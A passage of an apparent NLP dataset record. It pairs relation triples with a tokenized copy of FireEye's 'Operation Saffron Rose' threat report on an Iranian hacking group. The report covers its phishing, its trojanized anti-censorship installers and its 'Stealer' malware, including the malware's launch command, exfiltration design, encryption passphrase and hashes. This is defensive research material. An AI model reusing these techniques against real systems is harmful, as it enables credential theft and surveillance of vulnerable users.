"evidence": [260, 261]}, {"r": "P3", "h": 155, "t": 151, "evidence": [260, 261]}, {"r": "P27", "h": 0, "t": 15, "evidence": [0, 21]}, {"r": "P27", "h": 0, "t": 16, "evidence": [0, 21]}, {"r": "P27", "h": 0, "t": 17, "evidence": [0, 21]}, {"r": "P27", "h": 0, "t": 20, "evidence": [0, 43]}, {"r": "P27", "h": 0, "t": 31, "evidence": [0, 60]}, {"r": "P27", "h": 0, "t": 32, "evidence": [0, 60]}, {"r": "P27", "h": 0, "t": 122, "evidence": [0, 256]}, {"r": "P13", "h": 43, "t": 36, "evidence": [101, 134]}, {"r": "P13", "h": 43, "t": 37, "evidence": [101, 134]}, {"r": "P13", "h": 43, "t": 38, "evidence": [101, 134]}, {"r": "P13", "h": 43, "t": 39, "evidence": [101, 134]}, {"r": "P13", "h": 43, "t": 66, "evidence": [134, 170]}, {"r": "P13", "h": 43, "t": 67, "evidence": [134, 170]}, {"r": "P28", "h": 4, "t": 135, "evidence": [14, 259]}, {"r": "P28", "h": 4, "t": 136, "evidence": [14, 259]}, {"r": "P28", "h": 4, "t": 137, "evidence": [14, 259]}, {"r": "P28", "h": 4, "t": 138, "evidence": [14, 259]}, {"r": "P28", "h": 4, "t": 140, "evidence": [14, 259]}, {"r": "P28", "h": 4, "t": 124, "evidence": [14, 258]}, {"r": "P28", "h": 4, "t": 128, "evidence": [14, 258]}, {"r": "P28", "h": 4, "t": 114, "evidence": [14, 248]}, {"r": "P28", "h": 4, "t": 108, "evidence": [14, 246]}], "title": "201405FireEyeSaffronRose", "sents": [["SPECIAL", "REPORT", "OPERATION", "SAFFRON", "ROSE", "2013", "Authors", ":", "Nart", "Villeneuve", ",", "Ned", "Moran", ",", "Thoufique", "Haq", "and", "Mike", "Scott", "SECURITY", "REIMAGINED", "Fireeye"], [":"], ["Operation", "Saffron", "Rose", "2013", "CONTENTS", "Introduction", "................................................................................................................................................................................................................................................................................................................................................", "2"], ["Background", "...................................................................................................................................................................................................................................................................................................................................", "2", "Attack", "Vectors", "......................................................................................................................................................................................................................................................................................................................................"], ["4"], ["The", "\u201c", "Stealer", "\u201d", "Malware", "...................................................................................................................................................................................................................................................................................................."], ["6"], ["The", "\u201c", "Stealer", "\u201d", "Builder", "and", "Tools", "........................................................................................................................................................................................................................................................."], ["11", "Command", "-", "and", "-", "Control", "Infrastructure", "..................................................................................................................................................................................................................", "13", "Victimology", "...........................................................................................................................................................................................................................................................................................................................................", "15"], ["Attribution", "..............................................................................................................................................................................................................................................................................................................................................", "16"], ["Conclusion", "................................................................................................................................................................................................................................................................................................................................................"], ["19", "About", "FireEye", ",", "Inc", "..........................................................................................................................................................................................................................................................................................", "19", "1", "www.fireeye.com", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["We", "believe", "we", "\u2019re", "seeing", "an", "evolution", "and", "development", "in", "Iranian", "-", "based", "cyber", "activity", "."], ["In", "years", "past", ",", "Iranian", "actors", "primarily", "committed", "politically", "-", "motivated", "website", "defacement", "and", "DDoS", "attacks.1"], ["More", "recently", ",", "however", ",", "suspected", "Iranian", "actors", "have", "destroyed", "data", "on", "thousands", "of", "computers", "with", "the", "Shamoon", "virus,2", "and", "they", "have", "penetrated", "the", "Navy", "Marine", "Corps", "Intranet", "(", "NMCI", ")", ",", "which", "is", "used", "by", "the", "U.S.", "Navy", "worldwide.3", "In", "this", "report", ",", "we", "document", "the", "activities", "of", "the", "Ajax", "Security", "Team", ",", "a", "hacking", "group", "believed", "to", "be", "operating", "from", "Iran", "."], ["Members", "of", "this", "group", "have", "accounts", "on", "popular", "Iranian", "hacker", "forums", "such", "as", "ashiyane[.]org", "and", "shabgard[.]org", ",", "and", "they", "have", "engaged", "in", "website", "defacements", "under", "the", "group", "name", "\u201c", "AjaxTM", "\u201d", "since", "2010", "."], ["By", "2014", ",", "the", "Ajax", "Security", "Team", "had", "transitioned", "from", "performing", "defacements", "(", "their", "last", "defacement", "was", "in", "December", "2013", ")", "to", "malware", "-", "based", "espionage", ",", "using", "a", "methodology", "consistent", "with", "other", "advanced", "persistent", "threat", "actors", "in", "this", "region", "."], ["It", "is", "unclear", "if", "the", "Ajax", "Security", "Team", "operates", "in", "isolation", "or", "if", "they", "are", "a", "part", "of", "a", "larger", "coordinated", "effort", "."], ["The", "Ajax", "Security", "Team", "itself", "uses", "malware", "tools", "that", "do", "not", "appear", "to", "be", "publicly", "available", "."], ["We", "have", "seen", "this", "group", "leverage", "varied", "social", "engineering", "tactics", "as", "a", "means", "to", "lure", "their", "targets", "into", "infecting", "themselves", "with", "malware", "."], ["Although", "we", "have", "not", "observed", "the", "use", "of", "exploits", "as", "a", "means", "to", "infect", "victims", ",", "members", "of", "the", "Ajax", "Security", "Team", "have", "previously", "used", "publicly", "available", "exploit", "code", "in", "web", "site", "defacement", "operations", "."], ["In", "sum", ",", "FireEye", "has", "recently", "observed", "the", "Ajax", "Security", "Team", "conducting", "multiple", "cyber", "espionage", "operations", "against", "companies", "in", "the", "defense", "industrial", "base", "(", "DIB", ")", "within", "the", "Unites", "States", ",", "as", "well", "as", "targeting", "local", "Iranian", "users", "of", "anti", "-", "censorship", "technologies", "that", "bypass", "Iran", "\u2019s", "Internet", "filtering", "system", "."], ["Background"], ["The", "transition", "from", "patriotic", "hacking", "to", "cyber", "espionage", "is", "not", "an", "uncommon", "phenomenon", "."], ["It", "typically", "follows", "an", "increasing", "politicization", "within", "the", "hacking", "community", ",", "particularly", "around", "geopolitical", "events", "."], ["This", "is", "followed", "by", "increasing", "links", "between", "the", "hacking", "community", "and", "the", "state", ",", "particularly", "military", "and/or", "intelligence", "organizations", "."], ["In", "the", "late", "1990", "\u2019s", "and", "early", "2000", "\u2019s", ",", "a", "similar", "transition", "occurred", "within", "the", "Chinese", "hacking", "community", "."], ["During", "that", "time", "period", ",", "the", "Chinese", "hacking", "community", "engaged", "in", "website", "defacements", "and", "denial", "of", "service", "attacks", "in", "conjunction", "with", "incidents", "such", "as", "the", "accidental", "bombing", "of", "the", "Chinese", "embassy", "in", "Belgrade", "in", "1999", ",", "the", "collision", "of", "a", "U.S.", "spy", "plane", "and", "a", "Chinese", "military", "plane", "in", "2001", ",", "and", "the", "Japanese", "Prime", "Minister", "\u2019s", "controversial", "visit", "to", "the", "Yasukuni", "shrine", "in", "2005.4", "Around", "this", "time", "a", "significant", "shift", "in", "philosophy", "began", "to", "take", "place", "."], ["Members", "of", "the", "Chinese", "hacking", "community", "that", "participated", "in", "such", "attacks", "soon", "found", "that", "transitioning", "to", "cyber", "espionage", "was", "more", "rewarding", "\u2014", "both", "in", "terms", "of", "developing", "a", "more", "advanced", "skill", "set", "as", "well", "as", "in", "monetary", "remuneration", "."], ["One", "group", "known", "as", "NCPH"], ["(", "Network", "Crack", "Program", "Hacker", ")", ",", "whose", "founding", "member", "\u201c", "Wicked", "/", "Withered", "Rose", "\u201d", "was", "a", "patriotic", "hacker", ",", "made", "the", "transition", "to", "cyber", "espionage", "by", "founding", "a", "\u201c", "hacker", "-", "for", "-", "hire", "\u201d", "group", "1", "HP", "Security", "Research", "."], ["\u201c", "Threat", "Intelligence", "Briefing", "Episode", "11", "\u201d", "."], ["February", "2014", "."], ["2", "Perlroth", ",", "N.", "\u201c", "In", "Cyberattack", "on", "Saudi", "Firm", ",", "U.S.", "Sees", "Iran", "Firing", "Back", "\u201d", "."], ["October", "2012", "."], ["3", "Gallagher", ",", "S.", "\u201c", "Iranians", "hacked", "Navy", "network", "for", "four", "months", "?"], ["Not", "a", "surprise", "\u201d", "."], ["February", "2014", "."], ["4", "Key", "."], ["\u201c", "Honker", "Union", "of", "China", "to", "launch", "network", "attacks", "against", "Japan", "is", "a", "rumor", "\u201d", "."], ["September", "2010", "."], ["2", "www.fireeye.com", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "that", "simultaneously", "developed", "an", "association", "with"], ["the", "Chinese", "military.5"], ["The", "group", "began", "developing", "zero", "-", "day", "exploits", ",", "rootkits", "and", "remote", "access", "tools", "(", "RATs)\u2014using", "them", "in", "attacks", "against", "a", "variety", "of", "targets", "including", "the", "U.S.", "Department", "of", "Defense.6"], ["(", "One", "of", "this", "group", "\u2019s", "associates", ",", "\u201c", "whg", "\u201d", ",", "is", "still", "active", "and", "is", "believed", "to", "have", "developed", "one", "variant", "of", "the", "PlugX", "/"], ["SOGU", "malware.7", ")"], ["The", "rationale", "behind", "this", "transition", "within", "the", "Chinese", "hacking", "community", "is", "nicely", "summed", "up", "in", "a", "message", "by", "the", "\u201c", "Honker", "Union", "of", "China", "\u201d", "to", "its", "members", "in", "2010", ":"], ["What", "benefit", "can", "hacking", "a", "Web", "page", "bring", "our", "country", "and", "the", "people", "?"], ["It", "is", "only", "a", "form", "of", "emotional", "catharsis", ",", "please", "do", "not", "launch", "any", "pointless", "attacks", ",", "the", "real", "attack", "is", "to", "fatally", "damage", "their", "network", "or", "gain", "access", "to", "their", "sensitive", "information.8"], ["In", "Iran", ",", "the", "hacking", "community", "appears", "to", "be", "undergoing", "a", "similar", "transformation", "."], ["While", "a", "variety", "of", "Iranian", "hacker", "groups", "had", "engaged", "in", "politically", "motivated", "website", "defacements", ",", "the", "emergence", "of", "the", "\u201c", "Iranian", "Cyber", "Army", "\u201d", "in", "2009", "demonstrated", "\u201c", "a", "concentrated", "effort", "to", "promote", "the", "Iranian", "government", "\u2019s", "political", "narrative"], ["online\u201d.9"], ["They", "targeted", ",", "among", "others", ",", "news", "organizations", ",", "opposition", "websites", "and", "social", "media.10"], ["This", "marked", "the", "beginning", "of", "a", "largescale", "cyber", "offensive", "against", "the", "perceived", "enemies", "of", "the", "Iranian", "government", "."], ["5", "Foreign", "news", "and", "opposition", "websites", "are", "routinely", "blocked", "in", "Iran", ",", "as", "are", "the", "tools", "that", "allow", "users", "in", "Iran", "to", "bypass", "these", "restrictions.11"], ["One", "of", "the", "key", "stakeholders", "in", "Iran", "\u2019s", "Internet", "censorship", "program", "is", "the", "Iranian", "Revolutionary", "Guard", "Corps", "(", "IRGC", ")", ",", "under", "which", "the", "Basij", "paramilitary", "organization", "operates", "."], ["The", "Basij", "formed", "the", "Basij", "Cyber", "Council", "and", "actively", "recruits", "hackers", "in", "order", "to", "develop", "both", "defensive", "and", "offensive", "cyber", "capabilities.12"], ["There", "is", "increasing", "evidence", "to", "suggest", "that", "the", "hacker", "community", "in", "Iran", "is", "engaged", "in", "a", "transition", "from", "politically", "motivated", "defacements", "and", "denial", "of", "service", "attacks", "to", "cyber", "espionage", "activities", "."], ["This", "model", "is", "consistent", "with", "the", "Basij", "\u2019s", "recruitment", "of", "paramilitary", "volunteer", "hackers", "to", "\u201c", "engage", "in", "less", "complex", "hacking", "or", "infiltration", "operations", "\u201d", "leaving", "the", "more", "technical", "operations", "to", "entities", "over", "which", "they", "have", "increasingly", "direct", "control.13"], ["As", "such", ",", "the", "capabilities", "of", "threat", "actors", "operating", "from", "Iran", "have", "traditionally", "been", "considered", "limited.14"], ["However", ",", "the", "\u201c", "Shamoon", "\u201d", "attacks", ",", "which", "wiped", "computers", "in", "Saudi", "Arabia", "and", "Qatar", ",", "indicate", "an", "improvement", "in", "capabilities.15", "And", "unsurprisingly", ",", "Iran", "has", "reportedly", "increased", "its", "efforts", "to", "improve", "offensive", "capabilities", "after", "being", "targeted", "by", "Stuxnet", "and", "Flame.16", "Elegant", ",", "S.", "\u201c", "Enemies", "at", "The", "Firewall", "\u201d", "."], ["December", "2007", "."], ["Dunham", ",", "K.", "&", "Melnick", ",", "J.", "\u201c", "\u2019", "Wicked", "Rose", "\u2019", "and", "the", "NCPH", "Hacking", "Group", "\u201d", "."], ["Wikipedia", "."], ["\u201c", "Network", "Crack", "Program", "Hacker", "Group", "\u201d", "."], ["6", "Dunham", ",", "K.", "&", "Melnick", ",", "J.", "\u201c", "\u2019", "Wicked", "Rose", "\u2019", "and", "the", "NCPH", "Hacking", "Group", "\u201d", "."], ["7", "Blasco", ",", "J.", "\u201c", "The", "connection", "between", "the", "Plugx", "Chinese", "gang", "and", "the", "latest", "Internet", "Explorer", "Zeroday", "\u201d", "."], ["September", "2012", "."], ["8", "Key", "."], ["\u201c", "Honker", "Union", "of", "China", "to", "launch", "network", "attacks", "against", "Japan", "is", "a", "rumor", "\u201d", "."], ["September", "2010", "."], ["9", "OpenNet", "Initiative", "."], ["\u201c", "After", "the", "Green", "Movement", ":", "Internet", "Controls", "in", "Iran", "2009", "\u2013", "2012", "\u201d", "."], ["February", "2013", "."], ["10", "Rezvaniyeh", ",", "F.", "\u201c", "Pulling", "the", "Strings", "of", "the", "Net", ":", "Iran", "\u2019s", "Cyber", "Army", "\u201d", "."], ["February", "2010", "."], ["\u201c", "Twitter", "hackers", "appear", "to", "be", "Shiite", "group", "\u201d", "."], ["December", "2009", "."], ["11", "OpenNet", "Initiative", "."], ["\u201c", "Iran", "\u201d", "."], ["June", "2009", "."], ["12"], ["The", "IRGC", "has", "also", "indicated", "that", "they", "would", "welcome", "hackers", "that", "support", "the", "Iranian", "government", "."], ["Esfandiari", ",", "G."], ["\u201c", "Iran", "Says", "It", "Welcomes", "Hackers"], ["Who", "Work", "For", "Islamic", "Republic", "\u201d", "."], ["March", "2011", ",", "HP", "Security", "Research", "."], ["\u201c", "Threat", "Intelligence", "Briefing", "Episode", "11", "\u201d", "."], ["February", "2014", "."], ["3", "www.fireeye.com", "13", "BBC", "Persian", "."], ["\u201c", "Structure", "of", "Iran", "\u2019s", "Cyber", "Warfare", "\u201d", "."], ["14", "Mandiant", "."], ["\u201c", "M", "-", "Trends", ":", "Beyond", "the", "Breach", ",", "2014", "\u201d", ",", "page", "9", "."], ["April", "2014", "."], ["15", "Mount", ",", "M.", "\u201c", "U.S.", "Officials", "believe", "Iran", "behind", "recent", "cyber", "attacks", "\u201d", "."], ["October", "2012", "."], ["16", "Shalal", "-", "Esa", ",", "A.", "\u201c", "Iran", "strengthened", "cyber", "capabilities", "after", "Stuxnet", ":", "U.S.", "general", "\u201d", "."], ["January", "2013", ",", "Lim", ",", "K.", "\u201c", "Iran", "\u2019s", "cyber", "posture", "\u201d", "."], ["November", "2013", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Attack", "Vectors"], ["We", "have", "observed", "the", "Ajax", "Security", "Team", "use", "a", "variety", "of", "vectors", "to", "lure", "targets", "into", "installing", "malicious", "software", "and/or", "revealing", "login", "credentials", "."], ["These", "attack", "vectors", "include", "sending", "email", ",", "private", "messages", "via", "social", "media", ",", "fake", "login", "pages", ",", "and", "the", "propagation", "of", "anti", "-", "censorship", "software", "that", "has", "been", "infected", "with", "malware", "."], ["Spear", "phishing"], ["During", "our", "investigation", ",", "we", "discovered", "that", "these", "attackers", "sent", "targeted", "emails", ",", "as", "well", "as", "private", "messages", "through", "social", "media", "."], ["For", "example", ",", "the", "attackers", "targeted", "companies", "in", "the", "DIB", "using", "a", "fake", "conference", "page", "as", "a", "lure", "to", "trick", "targets", "into", "installing", "malicious", "software", "."], ["The", "attackers", "registered", "the", "domain", "\u201c", "aeroconf2014[.]org", "\u201d", "in", "order", "to", "impersonate", "the", "IEEE", "Aerospace", "conference", "\u2014", "the", "conference", "\u2019s", "actual", "domain", "is", "aeroconf.org", "\u2014", "and", "sent", "out", "an", "email", "with", "the", "following", "information", ":"], ["From", ":", "invite@aeroconf2014[.]org", "Subject", ":", "IEEE", "Aerospace", "Conference", "2014"], ["The", "email", "encouraged", "users", "to", "visit", "a", "fake", "conference", "website", "owned", "by", "the", "attackers", ":"], ["Upon", "visiting", "the", "website", ",", "visitors", "were", "notified", "that", "they", "must", "install", "\u201c", "proxy", "\u201d", "software", "in", "order", "to", "access", "it", ",", "which", "is", "actually", "malware", "."], ["Figure", "1", ":"], ["The", "Fake", "IEEE", "Aerospace"], ["Conference", "Website", "7", "4", "www.fireeye.com", "Bloomberg", "."], ["\u201c", "Neiman", "Marcus", "Hackers", "Set", "Off", "60,000", "Alerts", "While", "Bagging", "Credit", "Card", "Data", ".", "\u201d"], ["February", "2014", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Credential", "Phishing"], ["The", "attackers", "have", "also", "used", "phishing", "attacks", ",", "in", "which", "they", "set", "up", "Web", "pages", "to", "emulate", "various", "services", "that", "require", "security", "credentials", "."], ["The", "attackers", "tailored", "these", "login", "pages", "for", "specific", "targets", "in", "the", "DIB", "and", "spoofed", "a", "variety", "of", "services", "such", "as", "Outlook", "Web", "Access", "and", "VPN", "login", "pages", "."], ["If", "users", "attempt", "to", "login", "through", "these", "fake", "Web", "pages", ",", "the", "attackers", "collect", "their", "login", "credentials", "."], ["Anti", "-", "censorship", "Tools", "All", "Internet", "Service", "Providers", "(", "ISPs", ")", "in", "Iran", "are", "required", "to", "implement", "filtering", "technology", "that", "censors", "access", "to", "content", "which", "the", "Iranian", "government", "deems", "unacceptable.17"], ["This", "content", "includes", "categories", "such", "as", "pornography", "and", "political", "opposition.18"], ["In", "response", "to", "these", "restrictions", ",", "Iranians", "have", "been", "increasingly", "using", "software", "that", "bypasses", "such", "filtering", "technology", "."], ["To", "counter", "anti", "-", "censorship", "efforts", ",", "Iran", "has", "attempted", "to", "block", "the", "use", "of", "certain", "software", "tools.19", "In", "2012", ",", "researchers", "found", "that", "an", "anti", "-", "censorship", "tool", "that", "is", "primarily", "used", "by", "Internet", "users", "in", "Iran", "was", "bundled", "with", "malware", "and", "redistributed.20"], ["Our", "investigation", "found", "that", "malware", "-", "laden", "versions", "of", "legitimate", "anti", "-", "censorship", "software", ",", "such", "as", "Psiphon", "and", "Ultrasurf", ",", "were", "distributed", "to", "users", "Iran", "and", "Persian", "speaking", "people", "around", "the", "world", "."], ["Figure", "2", ":", "The", "Fake", "Outlook", "Web", "Access", "page", "17", "OpenNet", "Initiative", "."], ["\u201c", "Iran", "\u201d", "."], ["June", "2009", "."], ["18", "OpenNet", "Initiative", "."], ["\u201c", "After", "the", "Green", "Movement", ":", "Internet", "Controls", "in", "Iran", "2009", "\u2013", "2012", "\u201d", "."], ["February", "2013", "."], ["19", "Torbati", ",", "Y.", "\u201c", "Iran", "blocks", "use", "of", "tool", "to", "get", "around", "Internet", "filter", "\u201d", "."], ["March", "2013", "."], ["20", "Marquis", "-", "Boire", ",", "M.", "\u201c", "Iranian", "anti", "-", "censorship", "software", "\u2018", "Simurgh", "\u2019", "circulated", "with", "malicious", "backdoor", "\u201d", "."], ["May", "2012", "."], ["5", "www.fireeye.com", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["The", "\u201c", "Stealer", "\u201d", "Malware", "Host", "-", "based", "Indicators", "and", "Malware", "Functionality"], ["We", "have", "observed", "the", "Ajax", "Security", "Team", "use", "a", "malware", "family", "that", "they", "identify", "simply", "as", "\u2018", "Stealer", "\u2019", "."], ["They", "deliver", "this", "malware", "as", "a", "malicious", "executable", "(", "dropper", ")", "."], ["The", "executable", "is", "a", "CAB", "extractor", "that", "drops", "the", "implant", "IntelRS.exe", "."], ["This", "implant", ",", "in", "turn", ",", "drops", "various", "other", "components", "into", "C:\\", "Documents", "and", "Settings\\{USER}\\Application", "Data\\IntelRapidStart\\."], ["The", "following", "files", "are", "written", "to", "disk", "in", "this", "location", ":", "File", "Figure", "3", ":"], ["StartBypass", "Ordinal", "6", "www.fireeye.com"], ["The", "IntelRS.exe", "is", "written", "in", ".NET", "and", "is", "aptly", "named", "\u201c", "Stealer", "\u201d", ",", "as", "it", "has", "various", "data", "collection", "modules", "."], ["It", "drops", "and", "launches", "AppTransferWiz.dll", "via", "the", "following", "command", ":", "\u201c", "C:\\WINDOWS\\system32\\rundll32.exe", "\u201d", "\u201c", "C:\\", "Documents", "and", "Settings\\{USER}\\Application", "Data\\IntelRapidStart\\AppTransferWiz.dll\u201d,#110", "110", "is", "an", "ordinal", "that", "corresponds", "to", "\u201c", "StartBypass", "\u201d", "export", "in", "AppTransferWiz.dll", "."], ["Functionality", "IntelRS.exe", "Various", "stealer", "components", "and", "encryption", "implementation", "DelphiNative.dll", "Browser", "URL", "extraction", ",", "IE", "Accounts", ",", "RDP", "accounts", "(", "Imported", "by", "IntelRS.exe", ")", "IntelRS.exe.config", "Config", "containing", "supported", ".NET"], ["versions", "for", "IntelRS.exe", "AppTransferWiz.dll", "FTP", "exfiltration", "(", "Launched", "by", "IntelRS.exe", ")", "RapidStartTech.stl", "Base64", "encoded", "config", "block", "containing", "FTP", "credentials", ",", "implant", "name", ",", "decoy", "name", ",", "screenshot", "interval", "and", "booleans", "for", "startup", ",", "keylogger", "and", "screenshot", "Fireeye", ":"], ["Operation", "Saffron", "Rose", "2013", "Data", "exfiltration", "is", "conducted", "over", "FTP", "by"], ["AppTransferWiz.dll", ",", "which", "acts", "as", "an", "FTP", "client", "."], ["This", "DLL", "is", "written", "in", "Delphi", "."], ["There", "is", "code", "to", "exfiltrate", "data", "over", "HTTP", "POST", "as", "well", ",", "but", "it", "is", "unused", "."], ["We", "also", "found", "incomplete", "code", "that", "would", "perform", "SFTP", "and", "SMTP", "exfiltration", ",", "which", "could", "be", "completed", "in", "a", "future", "version", "."], ["\u2022", "Takes", "various", "screenshots", "\u2022", "Harvests", "instant", "messaging", "(", "IM", ")", "account", "information", ":"], ["GTalk", ",", "Pidgin", ",", "Yahoo", ",", "Skype", "\u2022", "Tracks", "credentials", ",", "bookmarks", "and", "history", "from", "major", "browsers", ":", "Chrome", ",", "Firefox", ",", "Opera", "State", "is", "maintained", "between", "the", "stealer", "component", "IntelRS.exe", "and", "the", "FTP", "component", "AppTransferWiz", ".", "DLL", "using", "a", "file", "from", "the", "FTP", "server", "\u201c", "sqlite3.dll", "\u201d", ",", "as", "well", "as", "a", "global", "atom", "\u201c", "SQLiteFinish", "\u201d", "."], ["IntelRS.exe", "waits", "in", "an", "indefinite", "loop", ",", "until", "AppTransferWiz", ".", "DLL", "defines", "this", "state", "."], ["\u2022", "Collects", "email", "account", "information", "\u2022", "Extracts", "installed", "proxy", "software", "configuration", "information", "\u2022", "Harvests", "data", "from", "installed", "cookies", "Once", "the", "state", "is", "set", ",", "IntelRS.exe", "proceeds", "to", "collect", "data", "from", "various", "areas", "in", "the", "system", "as", "described", "below", ":", "IntelRS.exe", "loads", "a", "Delphi", "component", "called", "DelphiNative", ".", "DLL", ",", "which", "implements", "some", "additional", "data", "theft", "functionality", "for", "the", "following", ":", "\u2022", "Collects", "system", "information", ":", "hostname", ",", "username", ",", "timezone", ",", "IP", "addresses", ",", "open", "ports", ",", "installed", "applications", ",", "running", "processes", ",", "etc", ".", "\u2022", "Internet", "Explorer", "(", "IE", ")", "accounts", "\u2022", "Remote", "Desktop", "Protocol", "(", "RDP", ")", "accounts"], ["Performs", "key", "logging", "\u2022", "Browser", "URLs", "\u2022", "Figure", "4", ":", "AppTransferWizard", "."], ["dll", "creates", "sqlite3.dll", "and", "global", "atom", "Figure", "5", ":", "IntelRS.exe", "sleeps", "until", "global", "atom", "is", "set", "and", "sqlite3.dll", "is", "present", "7", "www.fireeye.com", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["The", "Stealer", "component", "uses", "common", "techniques", "to", "acquire", "credential", "data", "."], ["For", "instance", ",", "it", "loads", "vaultcli", ".", "DLL", "and", "uses", "various", "APIs", "shown", "below", "to", "acquire", "RDP", "accounts", "from", "the", "Windows", "vault", "."], ["Harvested", "data", "is", "encrypted", "and", "written", "to", "disk", "on", "the", "local", "host", "."], ["The", "filenames", "for", "these", "encrypted", "files", "follow", "this", "naming", "scheme", ":", "{", "stolen", "data", "type}_{victim", "system", "name", "}", "_"], ["YYYYMMDD_HHMM.Enc"], ["The", "{", "stolen", "data", "type", "}", "parameter", "indicates", "where", "the", "data", "was", "harvested", "from", "(", "e.g.", ",", "a", "Web", "browser", ",", "an", "instant", "messenger", "application", ",", "installed", "proxy", "software", ")", "."], ["Figure", "6", ":", "Acquiring", "RDP"], ["Accounts", "8", "www.fireeye.com", "21", "ShawnFa", "."], ["\u201c", "The", "Differences", "Between", "Rijndael", "and", "AES", "\u201d", "."], ["October", "2006", "."], ["22", "Wikipedia", "."], ["\u201c", "PBKDF2", "\u201d", "."], ["23", "Microsoft", "."], ["\u201c", "Rfc2898DeriveBytes", "Class", "\u201d", "."], ["Analysis", "of", "the", "malware", "indicates", "that", "the", "data", "is", "encrypted", "via", "a", "Rijndael", "cipher", "implementation", ";", "more", "specifically", "it", "uses", "AES", "which", "is", "a", "specific", "set", "of", "configurations", "of", "Rijndael", "."], ["It", "uses", "a", "key", "size", "of", "256", "bytes", "and", "block", "size", "of", "128", "bytes", ",", "which", "conforms", "to", "the", "FIPS-197", "specification", "of", "AES-256.21", "It", "utilizes", "the", "passphrase", "\u2018", "HavijeBaba", "\u2019", "and", "a", "salt", "of", "\u2018", "salam!*%", "#", "\u2019", "as", "an", "input", "to", "PBKDF2"], ["(", "Password", "-", "Based", "Key", "Derivation", "Function", "2", ")", "to", "derive", "the", "key", "and", "initialization", "vector", "for", "the"], ["encryption.22"], ["This", "key", "derivation", "implementation", "in", ".NET", "is", "done", "using", "the", "Rfc2898DeriveBytes"], ["class.23", "The", "passphrase", "and", "salt", "are", "Persian", "language", "words", "."], ["\u201c", "Havij", "\u201d", "means", "\u201c", "carrot", "\u201d", ",", "\u201c", "Baba", "\u201d", "means", "\u201c", "father", "\u201d", ",", "and", "\u201c", "Salam", "\u201d", "is", "a", "common", "greeting", "that", "means", "\u201c", "Peace", "\u201d", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Sample", "Timeline"], ["We", "identified", "17", "droppers", "during", "this", "research", ",", "including", ":", "\u2022", "9", "samples", "compiled", "on", "2013", "-", "02", "-", "17", "07:00", "Spoofed", "Installers"], ["Many", "of", "the", "malicious", "executables", "(", "droppers", ")", "that", "we", "collected", "were", "bundled", "with", "legitimate", "installers", "for", "VPN", "or", "proxy", "software", "."], ["Examples", "include", ":", "\u2022", "4", "samples", "compiled", "on", "2009", "-", "07", "-", "13", "23:42", "\u2022", "\u2022", "3", "sample", "compiled", "on", "2013", "-", "10", "-", "14", "06:48", "6dc7cc33a3cdcfee6c4edb6c085b869d", "was", "bundled", "with", "an", "installer", "for", "Ultrasurf", "Proxy", "software", "."], ["\u2022", "1", "sample", "compiled", "on", "2013", "-", "10", "-", "13", "09:56", "\u2022", "3d26442f06b34df3d5921f89bf680ee9", "was", "bundled", "with", "an", "installer", "for", "Gerdoovpn", "virtual", "private", "network", "software", "."], ["\u2022", "3efd971db6fbae08e96535478888cff9", "was", "bundled", "with", "an", "installer", "for", "the", "Psiphon", "proxy", "."], ["\u2022", "288c91d6c0197e99b92c06496921bf2f", "was", "bundled", "with", "an", "installer", "for", "Proxifier", "software", "."], ["The", "2009", "compile", "time", "appears", "to", "have", "been", "forged", ",", "while", "the", "2013", "compile", "times", "may", "be", "legitimate", "."], ["In", "some", "cases", ",", "we", "found", "an", "implant", "but", "not", "the", "parent", "dropper", "."], ["In", "total", ",", "22", "of", "the", "23", "implants", "that", "we", "identified", "during", "our", "research", "had", "unique", "compile", "times", "ranging", "from", "2013", "-", "10", "-", "29", "until", "2014", "-", "03", "-", "15", "."], ["We", "identified", "two", "implants", "that", "were", "both", "compiled", "on", "2014", "-", "3", "-", "15", "at", "23:16", "."], ["These", "compile", "times", "appear", "to", "be", "legitimate", "and", "coincide", "with", "attempted", "intrusion", "activity", "attributed", "to", "these", "attackers", "."], ["Figure", "7", ":", "Icon", "for", "the", "Psiphon", "Anti", "-", "censorship", "Tool", "9", "www.fireeye.com"], ["These", "droppers", "were", "also", "designed", "to", "visually", "spoof", "the", "appearance", "of", "the", "above", "applications", "."], ["These", "droppers", "contained", "icons", "used", "in", "the", "legitimate", "installers", "for", "these", "programs", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Process", "Debug", "(", "PDB", ")", "Strings"], ["Analysis", "of", "the", "PDB", "strings", "seen", "in", "the", "implants", "indicates", "that", "there", "may", "be", "more", "than", "one", "developer", "working", "on", "the", "source", "code", "for", "the", "Stealer", "builder", "."], ["The", "following", "two", "PDB", "paths", "were", "seen", "in", "the", "collection", "of", "implants", "that", "we", "collected", ":", "\u2022", "d:\\svn\\Stealer\\source\\Stealer\\Stealer\\obj\\", "x86\\Release\\Stealer.pdb", "\u2022", "f:\\Projects\\C#\\Stealer\\source\\Stealer\\", "Stealer\\obj\\x86\\Release\\Stealer.pdb", "These", "strings", "indicate", "that", "the", "Stealer", "source", "code", "was", "stored", "in", "two", "different", "paths", "but", "not", "necessarily", "on", "two", "different", "computers", "."], ["The", "f:\\", "Projects\\", "path", "may", "be", "from", "an", "external", "storage", "device", "such", "as", "a", "thumb", "drive", "."], ["It", "is", "therefore", "possible", "that", "only", "one", "person", "has", "access", "to", "the", "source", "code", ",", "but", "keeps", "a", "separate", "repository", "on", "an", "external", "storage", "device", "."], ["Alternatively", ",", "the", "different", "file", "paths", "could", "be", "the", "result", "of", "two", "different", "actors", "storing", "their", "source", "code", "in", "two", "different", "locations", "."], ["Builder", "Artifacts"], ["In", "nine", "of", "the", "implants", "that", "we", "collected", ",", "we", "found", "a", "consistent", "portable", "executable", "(", "PE", ")", "resource", "with", "a", "SHA256", "of", "5156aca994ecfcb40458ead8c830cd66469d5f5", "a031392898d323a8d7a7f23d3", "."], ["This", "PE", "resource", "contains", "the", "VS_VERSION_INFO", "."], ["In", "layman", "\u2019s", "terms", ",", "this", "can", "best", "be", "described", "as", "the", "metadata", "describing", "the", "executable", "file", "."], ["This", "specific", "PE", "resource", "contained", "the", "following", "information", ":"], ["Note", "the", "InternalName", "of", "\u2018", "Stealer.exe", "\u2019", "."], ["This", "is", "the", "attackers", "\u2019", "name", "for", "this", "malware", "family", "."], 